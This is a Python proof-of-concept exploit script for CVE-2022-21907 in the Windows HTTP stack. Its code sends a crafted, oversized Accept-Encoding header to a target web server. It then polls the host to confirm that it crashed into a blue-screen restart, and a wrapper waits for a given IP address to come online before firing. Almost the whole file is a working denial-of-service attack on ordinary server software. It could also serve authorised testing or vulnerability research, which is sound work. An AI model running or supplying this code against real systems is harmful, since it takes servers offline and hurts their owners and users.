# Create by antx at 2022-01-17.
# integrated by Michele "o-zone@zerozone.it" just for fun, on 23.01.2022
# Modified by Seb to work on the target machine

import sys
import requests
import subprocess
import time
from ipaddress import ip_network

header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36'}
class CVE_2022_21907():
    def first_handshake(self, target: str):
        try:
            resp = requests.get(target, headers=header, timeout=10)
            if resp.status_code == 200:
                print(f'The first handshake: the target host is normal and can be verified by POC')
                return True
            print(f'First handshake: the target host is normal, but returns an exception, status code: {resp.status_code}')
            return False
        except Exception as e:
            print(f'First handshake error: The target host is abnormal, please check whether the target host is alive, error resp: {e}')
            return False

    def verify_handshake(self, target: str):
        try:
            resp = requests.get(target, headers=header, timeout=10)
            if resp.status_code == 200:
                print(f'Verification result: The target host has restarted and returned to normal')
                return False
            print(f'Verification result: The target host has restarted and returned to normal, but returned an exception with a status code: {resp.status_code}')
            return False
        except requests.exceptions.ConnectionError as e:
            print(f'Verification result: The verification is successful, the target host is abnormal, has been exploited and entered the blue screen restart')
            return True

    def poc(self, target: str):
        # headers = {'Accept-Encoding': 'doar-e, ftw, imo, ,'}      # CVE-2021-31166
        headers = {
            'Accept-Encoding': 'AAAAAAAAAAAAAAAAAAAAAAAA, '
                               'BBBBBBcccACCCACACATTATTATAASDFADFAFSDDAHJSKSKKSKKSKJHHSHHHAY&AU&**SISODDJJDJJDJJJDJJSU**S, '
                               'RRARRARYYYATTATTTTATTATTATSHHSGGUGFURYTIUHSLKJLKJMNLSJLJLJSLJJLJLKJHJVHGF, '
                               'TTYCTCTTTCGFDSGAHDTUYGKJHJLKJHGFUTYREYUTIYOUPIOOLPLMKNLIJOPKOLPKOPJLKOP, '
                               'OOOAOAOOOAOOAOOOAOOOAOOOAOO, '
                               '****************************stupiD, *, ,'
        }                                                           # CVE-2022-21907
        try:
            r = requests.get(target, headers=headers, timeout=10)
            print(f'POC handshake failed: {target} does not exist CVE-2022-21907 Vulnerability, may have been patched')
            return False
        except requests.exceptions.ReadTimeout as e:
            print(f'POC handshake success: {target} maybe can Exploit!')
            return True

    def dia(self, url: str):
        if 'http' not in url:
            target = f'http://{url}'
        elif 'https' in url:
            target = url.replace('https', 'http')
        else:
            target = url
        print(f'start verification: {target}')
        if not self.first_handshake(target):
            print(f'{target} does not exist CVE-2022-21907 Vulnerability')
            return
        self.poc(target)
        print(f'Deterministic verification again')
        while True:
            time.sleep(10)
            if not self.verify_handshake(target):
                break
            print(f'{target} have CVE-2022-21907 vulnerability, can be exploited!')


def is_target_up(ip: str) -> bool:
    return subprocess.run(["ping", "-n", "1", ip], capture_output=True).returncode == 0 # Cheeky: A nonzero status code means the target wasn't up

def wait_for_target_up(ip: str) -> None:
    # Wait for target to go up by continually pinging it
    print("Waiting for target to go up.", end="")
    wait_start = time.time()
    while not is_target_up(ip):
        print(".", end="")
    wait_end = time.time()
    print(" Target up! Took", wait_end-wait_start, "seconds of waiting.")

if __name__ == '__main__':
    # Parse arguments
    _, ip, outdir = sys.argv

    wait_for_target_up(ip)
    cve = CVE_2022_21907()
    cve.dia(format("http://" + ip + "/"))
